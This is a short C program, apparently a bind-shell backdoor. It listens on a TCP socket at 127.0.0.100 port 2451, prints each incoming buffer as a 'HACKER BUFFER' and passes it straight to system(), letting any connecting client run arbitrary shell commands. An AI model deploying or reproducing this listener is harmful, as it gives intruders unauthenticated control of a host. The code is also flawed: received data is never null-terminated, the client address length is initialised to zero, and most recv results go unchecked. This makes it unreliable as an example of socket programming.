#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>

#define SOCKET_ERROR -1

#define SERVER_PORT 2451

#define MEGA_OCTET 1024

int main(void)
{
	int SOCKET_Server = 0;
	struct sockaddr_in SOCKETADDR_IN_Server;
	char _recv[MEGA_OCTET];


	SOCKET_Server = socket(AF_INET, SOCK_STREAM, 0);

	if(SOCKET_Server == SOCKET_ERROR)
	{
		fprintf(stderr, "[SERVER] Error can't create socket .\n");
		perror("[SERVER INFOS] <!>");
		return EXIT_FAILURE;
	}

	SOCKETADDR_IN_Server.sin_port = htons(SERVER_PORT);
	SOCKETADDR_IN_Server.sin_family = AF_INET;
	SOCKETADDR_IN_Server.sin_addr.s_addr = inet_addr("127.0.0.100");

	if(bind(SOCKET_Server, (struct sockaddr*)&SOCKETADDR_IN_Server, sizeof(SOCKETADDR_IN_Server)) == SOCKET_ERROR)
	{
		fprintf(stderr, "[SERVER] Error can't bind socket with *SOCKETADDR_IN*\n");
		perror("[SERVER INFOS] <!>");
		goto SOCKET_ERROR_IS_DETECTED;
	}

	listen(SOCKET_Server, 5);

	int SOCKET_Client = 0;
	struct sockaddr_in SOCKETADDR_IN_Client;
	socklen_t SOCKLEN_Client = 0;

	SOCKET_Client = accept(SOCKET_Server, (struct sockaddr*)&SOCKETADDR_IN_Client, &SOCKLEN_Client);

	if(recv(SOCKET_Client, _recv, sizeof(_recv), 0) == SOCKET_ERROR)
	{
		fprintf(stderr, "[SERVER] Error received socket buffer with\n");
		perror("[SERVER INFOS] <!>");
		goto SOCKET_ERROR_IS_DETECTED;
	}

	printf("%s\n", _recv);

	while(strcmp(_recv, "exit") != 0)
	{
		recv(SOCKET_Client, _recv, sizeof(_recv), 0);

		printf("[+] HACKER BUFFER : %s\n", _recv);
		system(_recv);

	}

SOCKET_ERROR_IS_DETECTED:
  	close(SOCKET_Server);

	return EXIT_SUCCESS;
}
